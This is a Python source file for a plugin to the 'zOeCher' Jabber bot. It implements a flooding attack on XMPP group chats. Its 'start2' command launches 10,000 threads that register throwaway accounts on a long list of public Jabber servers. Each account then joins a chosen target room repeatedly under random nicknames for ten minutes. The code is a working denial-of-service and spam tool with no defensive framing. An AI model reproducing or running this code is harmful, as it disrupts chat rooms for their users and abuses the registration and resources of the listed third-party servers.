# zoecher 6.x plugin
# -*- coding: utf-8 -*-
#####################################################################
# This file is part of zOeCher 6.x
# Plugin 4 zOeCher Jabber Bot
# Coded By Silent.Hell (admin@smz.im)
# Official site: http://smz.im
# All Rights Reserved, Copyright © 2o13
#####################################################################
import os, xmpp, time, sys, time, pdb, urllib, threading, types, random


HANG = 0
HANG_SERV = ['jwchat.org','jabber.ru','talk.mipt.ru','jabber.pm','jabber.re','jabber.mit.ru','supertalk.org','xmpp.jp','jabber.ir','skyjabber.ru','im.apinc.org','jabber.snc.ru','syriatalk.sy','starstalk.net','jabbem.ru','jabber.sx','skyjabber.ru','myjid.eu','linux.pl','akl.lt','jabber.sk','syriatell.org','syriamoon.org','syriaworld.org','syriaa.ru','jabben.ru','freize.org','jabber.cz','jsmart.eu','forat.org','jabber.se','jabbim.pl','syriaworld.org','syriatalks.org','syriaplus.org','arabstalk.org','syriahope.org','syriatop.org','jabber.sy','jabbir.org','arabway.org','syriamoon.org','jabber.mipt.ru','jabber.web.id','matrixteam.org','matrixtalk.org','syriasun.org','skyrose.org']
namezz = ['*00*2','fuckyouall**','zoecher-006','zoecher-00','zoecher-001','zoecher-005','zoecher-004','zoecher-002','zoecher-003','spammer','spam-bot','zoecher-bot','zoo-bot','zoo-1993','6-5-1993','j1k','no1like.ME','the-fucker','by.Me','S.H','My.TM','zOeCh','11','20','.5.','-9-','~X~','just4fun','chucky']


def hang_hnd_join(cl, groupchat):
  nick = ''+str(random.randrange(00, 1000))+u' !!'
  prs = xmpp.protocol.Presence(groupchat+'/'+nick)
  prs.setTag('x', namespace=xmpp.NS_MUC).addChild('history', {'maxchars':'0', 'maxstanzas':'0'})
  try:
    cl.send(prs)
  except:
    pass


def hang_gen(min, max):
  sr=0
  st=''
  if min<1 or max<1:
    return False
  if min==max:
    sr=max
  else:
    sr=random.randrange(min, max)
  while len(st)!=sr:
    n=random.randrange(48, 122)
    st+=chr(n)
  return st
	
def hang_otake(_len = None, sg = None):
  if sg == None:
    sg = 'abcdefghijklmnopqrstuvwxyz-.!?+%$*1234567890'
  if _len == None:
    _len = random.Random().randint(1, 100)
  s = ''
  l = len(sg)
  while _len > 0:
    s += sg[random.Random().randint(0, l - 1)]
    _len -= 1
  return s

def hang_timer(type,source,parameters):
  global HANG
  time.sleep(600)
  if HANG:
    HANG = 0
    reply(type, source, u'Finished *HOHO*')

def hang_thread(p):
  if len(p)>10:
    if p[0] in [101] and p[6] in [49]:
      return True
  return False

		      
def hang_start(type,source,parameters):
  global HANG
  global HANG_SERV
  if parameters:
    if not parameters.count('@'):
      reply(type, source, u'Wrong command.')
      return
    body = parameters.split()
    if parameters.count(u'santa'):
      reply(type, source, u'Wrong room.')
      return
    conf = body[0].lower()
    HANG = 1
    reply(type,source,u'Ok')
    threading.Thread(None, hang_timer, 'hang_timer'+str(random.randrange(0, 9999)), (type,source,parameters)).start()
    for x in range(0, 10000):
      threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), (type,source,conf)).start()

           
def handler_hang_reg(type, source, conf):
  if not HANG:
    return
  try:
    gserv = random.choice(WAR_Serv2)
    namez = random.choice(WAR_NICKS2)
    name, domain, password, newBotJid, mainRes = namez, gserv, WAR_PASS2, 0, War_Resource
    node = unicode(name)
    lastnick = name
    jid = xmpp.protocol.JID(node=node, domain=domain, resource=mainRes)
    psw = u''
    cl = xmpp.Client(jid.getDomain(), debug=[])
    con = cl.connect()
    if not con:
      threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), (type,source,conf)).start()
      return
    try:
      xmpp.features.register(cl, domain, {'username': node, 'password':password})
    except AttributeError:
      pass
    au=cl.auth(jid.getNode(), password, jid.getResource())
    if not au:
      threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), (type,source,conf)).start()
      return
    cl.sendInitPresence()
    if cl.isConnected():
      threading.Thread(None, handler_hang_cycle, 'handler_hang_cycle'+str(random.randrange(0, 9999)), (cl,conf)).start()
    else:
      threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), (type,source,conf)).start()
      return
  except:
    pass

def handler_hang_cycle(cl, conf):
  z=0
  while HANG and cl.isConnected():
    hang_hnd_join(cl, conf)
    time.sleep(0.0)
    z+=1
    if z%50==0:
      print z
  if HANG:
    try:
      threading.Thread(None, handler_hang_reg, 'handler_hang_reg'+str(random.randrange(0, 9999)), ('','',conf)).start()
    except:
      pass
  else:
    try:
      cl.disconnect()
    except:
      pass

def hang_stop(type, source, parameters):
  global HANG
  if HANG:
    HANG = 0
    reply(type,source,u'Stopped.')
    return
  else:
    reply(type,source,u'Not Active.')


register(hang_start, Prefix+'start2', 9)
register(hang_stop, Prefix+'stop2', 9)
